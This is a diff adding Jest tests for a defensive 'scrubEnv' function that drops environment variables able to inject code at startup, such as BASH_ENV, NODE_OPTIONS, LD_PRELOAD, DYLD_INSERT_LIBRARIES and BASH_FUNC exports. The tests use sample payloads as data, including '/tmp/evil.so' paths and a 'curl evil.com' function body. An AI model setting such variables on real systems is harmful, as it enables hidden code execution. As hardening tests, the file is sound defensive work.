@@ -83,6 +83,98 @@ describe('scrubEnv', () => {
     const { env } = scrubEnv({ QUALOPS_ENV_SCRUBBED: '1' });
     expect(env['QUALOPS_ENV_SCRUBBED']).toBe('1');
   });
+
+  // Code-execution startup-injection vectors
+  test('drops BASH_ENV — bash sources this for every non-interactive shell', () => {
+    const { env, dropped } = scrubEnv({ BASH_ENV: '/tmp/evil.sh', PATH: '/usr/bin' });
+    expect(env['BASH_ENV']).toBeUndefined();
+    expect(dropped).toContain('BASH_ENV');
+  });
+
+  test('drops ENV — POSIX sh/dash equivalent of BASH_ENV', () => {
+    const { env, dropped } = scrubEnv({ ENV: '/tmp/evil.sh', PATH: '/usr/bin' });
+    expect(env['ENV']).toBeUndefined();
+    expect(dropped).toContain('ENV');
+  });
+
+  test('drops NODE_OPTIONS — --require/--loader executes code on every node invocation', () => {
+    const { env, dropped } = scrubEnv({
+      NODE_OPTIONS: '--require /tmp/evil.js',
+      PATH: '/usr/bin',
+    });
+    expect(env['NODE_OPTIONS']).toBeUndefined();
+    expect(dropped).toContain('NODE_OPTIONS');
+  });
+
+  test('drops PYTHONSTARTUP', () => {
+    const { env, dropped } = scrubEnv({ PYTHONSTARTUP: '/tmp/evil.py', PATH: '/usr/bin' });
+    expect(env['PYTHONSTARTUP']).toBeUndefined();
+    expect(dropped).toContain('PYTHONSTARTUP');
+  });
+
+  test('drops RUBYOPT — -r flag loads arbitrary files', () => {
+    const { env, dropped } = scrubEnv({ RUBYOPT: '-r/tmp/evil', PATH: '/usr/bin' });
+    expect(env['RUBYOPT']).toBeUndefined();
+    expect(dropped).toContain('RUBYOPT');
+  });
+
+  test('drops PERL5OPT — -M flag loads arbitrary modules', () => {
+    const { env, dropped } = scrubEnv({ PERL5OPT: '-M/tmp/evil', PATH: '/usr/bin' });
+    expect(env['PERL5OPT']).toBeUndefined();
+    expect(dropped).toContain('PERL5OPT');
+  });
+
+  test('drops JAVA_TOOL_OPTIONS — JVM agent injection', () => {
+    const { env, dropped } = scrubEnv({
+      JAVA_TOOL_OPTIONS: '-javaagent:/tmp/evil.jar',
+      PATH: '/usr/bin',
+    });
+    expect(env['JAVA_TOOL_OPTIONS']).toBeUndefined();
+    expect(dropped).toContain('JAVA_TOOL_OPTIONS');
+  });
+
+  // Dynamic linker injection
+  test('drops LD_PRELOAD — shared library injection on Linux', () => {
+    const { env, dropped } = scrubEnv({ LD_PRELOAD: '/tmp/evil.so', PATH: '/usr/bin' });
+    expect(env['LD_PRELOAD']).toBeUndefined();
+    expect(dropped).toContain('LD_PRELOAD');
+  });
+
+  test('drops LD_AUDIT — audit interface injection on Linux', () => {
+    const { env, dropped } = scrubEnv({ LD_AUDIT: '/tmp/evil.so', PATH: '/usr/bin' });
+    expect(env['LD_AUDIT']).toBeUndefined();
+    expect(dropped).toContain('LD_AUDIT');
+  });
+
+  test('drops DYLD_INSERT_LIBRARIES — shared library injection on macOS', () => {
+    const { env, dropped } = scrubEnv({
+      DYLD_INSERT_LIBRARIES: '/tmp/evil.dylib',
+      PATH: '/usr/bin',
+    });
+    expect(env['DYLD_INSERT_LIBRARIES']).toBeUndefined();
+    expect(dropped).toContain('DYLD_INSERT_LIBRARIES');
+  });
+
+  // Bash function export injection
+  test('drops BASH_FUNC_* exports — bash loads these as functions on startup', () => {
+    const { env, dropped } = scrubEnv({
+      'BASH_FUNC_evil%%': '() { curl evil.com; }',
+      PATH: '/usr/bin',
+    });
+    expect(env['BASH_FUNC_evil%%']).toBeUndefined();
+    expect(dropped).toContain('BASH_FUNC_evil%%');
+  });
+
+  // Safe vars that should still pass through
+  test('LD_LIBRARY_PATH is kept — library resolution path, no startup execution risk', () => {
+    const { env } = scrubEnv({ LD_LIBRARY_PATH: '/opt/lib', PATH: '/usr/bin' });
+    expect(env['LD_LIBRARY_PATH']).toBe('/opt/lib');
+  });
+
+  test('DYLD_LIBRARY_PATH is kept — library resolution path, no startup execution risk', () => {
+    const { env } = scrubEnv({ DYLD_LIBRARY_PATH: '/opt/lib', PATH: '/usr/bin' });
+    expect(env['DYLD_LIBRARY_PATH']).toBe('/opt/lib');
+  });
 });
 
 describe('applyEnvScrub', () => {
